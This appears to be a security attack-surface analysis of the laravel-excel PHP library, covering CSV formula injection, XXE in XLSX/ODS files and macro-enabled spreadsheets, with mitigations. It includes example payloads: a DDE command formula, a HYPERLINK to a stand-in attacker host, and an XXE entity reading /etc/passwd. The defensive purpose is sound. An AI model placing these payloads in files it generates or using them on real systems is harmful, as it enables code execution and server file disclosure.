# Attack Surface Analysis for spartnernl/laravel-excel

## Attack Surface: [CSV Injection (Formula Injection)](./attack_surfaces/csv_injection__formula_injection_.md)

*   **Description:** Malicious formulas embedded in CSV, TSV, or even XLSX/XLS files can be executed when the file is opened in a spreadsheet program.
    *   **How `laravel-excel` Contributes:** The library facilitates the *import* of these potentially malicious files. It does *not* inherently sanitize or validate the *content* of the cells. This is the core issue.
    *   **Example:** A cell containing `=CMD|' /C calc'!A0` (Windows) or `=HYPERLINK("http://attacker.com/malware","Click")`.
    *   **Impact:** Code execution on the user's machine, data exfiltration, phishing, system compromise.
    *   **Risk Severity:** Critical (if imported data is displayed without escaping) / High (if imported data is used in other contexts without proper validation).
    *   **Mitigation Strategies:**
        *   **Developer:** *Never* directly display data imported from spreadsheets without thorough sanitization and escaping. Treat *all* imported cell values as untrusted user input. Use a dedicated, security-focused CSV parsing library if you need to extract data from CSV. HTML-encode data before displaying it. Use parameterized queries or ORM methods for database interactions.
        *   **User:** Be cautious when opening spreadsheets from untrusted sources. Disable automatic formula calculation.

## Attack Surface: [XML External Entity (XXE) Injection (XLSX/ODS)](./attack_surfaces/xml_external_entity__xxe__injection__xlsxods_.md)

*   **Description:** Malicious XLSX or ODS files can contain XML External Entity references, leading to file disclosure, SSRF, or DoS.
    *   **How `laravel-excel` Contributes:** The library uses `phpoffice/phpspreadsheet` to handle XLSX/ODS files, which are XML-based.  `laravel-excel`'s role is in providing the interface to *use* this potentially vulnerable functionality.
    *   **Example:** An XLSX file with a crafted `workbook.xml` containing `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`.
    *   **Impact:** Disclosure of sensitive server files, internal network access (SSRF), denial of service.
    *   **Risk Severity:** High.
    *   **Mitigation Strategies:**
        *   **Developer:** Ensure `laravel-excel` and `phpoffice/phpspreadsheet` are up-to-date. Monitor for security advisories related to XXE. Avoid processing untrusted XML directly (rely on the library's handling, but stay updated).
        *   **User:** N/A (primarily a server-side vulnerability).

## Attack Surface: [Macro Execution (XLS, XLSM, etc.)](./attack_surfaces/macro_execution__xls__xlsm__etc__.md)

*   **Description:** Macro-enabled spreadsheets can contain malicious VBA code.
    *   **How `laravel-excel` Contributes:** The library *may* allow the upload and processing of macro-enabled files. While it doesn't *execute* the macros, it facilitates their presence in the system.
    *   **Example:** An XLSM file with a VBA macro that downloads malware.
    *   **Impact:** Code execution on a user's machine, system compromise.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Developer:** *Strongly* discourage or disallow upload of macro-enabled formats. Implement strict file type validation. If essential, strip out macros during processing. Sandboxing is extremely complex and not recommended.
        *   **User:** Be extremely cautious with macro-enabled spreadsheets. Disable macros by default.

